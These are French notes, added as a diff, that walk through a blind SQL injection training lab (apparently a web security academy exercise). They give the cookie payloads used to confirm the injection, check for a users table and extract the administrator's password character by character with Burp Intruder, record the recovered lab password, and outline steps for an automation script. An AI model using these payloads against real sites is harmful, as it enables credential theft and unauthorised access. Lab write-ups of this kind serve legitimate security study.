@@ -1,0 +1,33 @@
+_____________________________________________________________Manuelle__________________________________________________________________
+
+#Blind SQL injection with conditional responses  ( si il y a 'Welcome back!' dans la reponse )
+
+Etape1 : Confimer l'qli : Cookie: ' AND 1=1-- et  ' AND 1=1-- 
+
+Etape2 : Confirmer que la taible users existe : ' AND (SELECT 'x' FROM users LIMIT 1)='x'--
+
+Etape3 : Confimer que l'utilisateur administrator existe dans la table users : ' AND (SELECT username FROM users WHERE username='administrator')='administrator'-- 
+
+Etape4 : Trouver le nombre de caractère que comporte le mot de passe de l'admin :  ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--  (Envoyez à intruider puis itterer de 1 à 100 pour trouver la taille du mot de passe)
+
+Etape5 : Determiner le mot de l'utilisateur administrator : ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--  (puis on envois à burp intrudeur pour itterer les position de 1 à 20 et les caractère)
+
+Etape6 : Récupérer tout les bonnes lettres pour former le mot de passe :  02gvg1ocqy4wd69xr3ad
+
+Etape7 : Ecrire le script en python pour automatiser tout ça
+
+____________________________________________________________Analyse_for_script________________________________________________________________
+
+0- Initialiser une session et lutiliser pour le reste du script 
+
+1- Recuperer le cookies
+
+2- Injecter le payload dans le tracking id contenu dans le cookies pour recuperer la taille du mot de passe
+
+3- Faire la force brute pour recuperer le mot de passe 
+
+4- Recuperer le csrf 
+
+5- Sur la page login se connecter pour solve le lab 
+
+
